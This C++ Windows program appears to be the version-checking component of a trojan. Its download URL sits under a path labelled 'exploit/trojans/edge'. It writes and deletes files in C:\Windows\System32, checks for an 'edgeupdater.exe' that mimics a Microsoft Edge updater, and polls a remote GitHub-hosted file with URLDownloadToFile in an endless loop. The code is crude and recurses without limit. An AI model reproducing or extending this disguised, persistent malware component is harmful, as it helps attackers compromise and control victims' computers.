#include <iostream>
#include<Windows.h>
#include<string>
#include <fstream>
#include<conio.h>
#include<sstream>
#pragma comment(lib, "urlmon.lib")

using namespace std;

void timeout();
bool check_if_version_exists();
bool check_if_installer_exists();
void check_version();

int main() {
	//timeout();
	cout << "hentai\n" << std::endl;
	check_version();
}

void timeout() {
	system("timeout 10 >nul");
}

bool check_if_version_exists() {
	ifstream ifile;
	ifile.open("C:\\Windows\\System32\\version");
	if(ifile) {
      		//cout << "version file exists\n";
   	} else {
      		//cout << "version file doesn't exist\n";
		return false;
	}
	ifile.close();
	return true;
}

bool check_if_installer_exists() {
	ifstream ifile;
	ifile.open("C:\\Windows\\System32\\edgeupdater.exe");
	if(ifile) {
      		cout << "installer exists\n";
   	} else {
      		cout << "installer doesn't exist\n";
	}
	ifile.close();
	return true;
}

void check_version() {
	if(check_if_version_exists()) {
		ifstream ifile;
		ifile.open("C:\\Windows\\System32\\version_new");
		if(ifile) {
			ifile.close();
      			cout << "version new exists\n";
			system("del C:\\Windows\\System32\\version_new");
			cout << "version new removed\n";
   			string dwnld_URL = "https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/exploit/trojans/edge/version";
    			string savepath = "C:\\Windows\\System32\\version_new";
    			URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
			cout << "version new downloaded\n";			

   			ifstream f("C:\\Windows\\System32\\version"); //taking file as inputstream
   			string str;
   			if(f) {
      			ostringstream ss;
      			ss << f.rdbuf(); // reading data
      			str = ss.str();
   			}
			f.close();
   			cout << "\nold version is: " << str;
			
   			ifstream f1("C:\\Windows\\System32\\version_new"); //taking file as inputstream
   			string str1;
   			if(f1) {
      			ostringstream ss;
      			ss << f1.rdbuf(); // reading data
      			str1 = ss.str();
   			}

			f1.close();
   			cout << "version new is: " << str1 << "\n";

			if(str == str1) {
				cout << "version is up to date\n";
			} else {
				cout << "updating\n";
				system("del C:\\Windows\\System32\\version");
				CopyFile("C:\\Windows\\System32\\version_new", "C:\\Windows\\System32\\version", TRUE);
			}
			
			for(;;) {
				timeout();
				system("cls");
				check_version();
			}
			


		} else {
      			cout << "version new doesn't exist\n";
			string dwnld_URL = "https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/exploit/trojans/edge/version";
    			string savepath = "C:\\Windows\\System32\\version_new";
    			URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
			cout << "version new downloaded\n";
			check_version();
		}
		ifile.close();
	} else {
		cout << "version file doesn't exist\n";
		system("echo hentai > C:\\Windows\\System32\\version");
		check_version();
	}
}
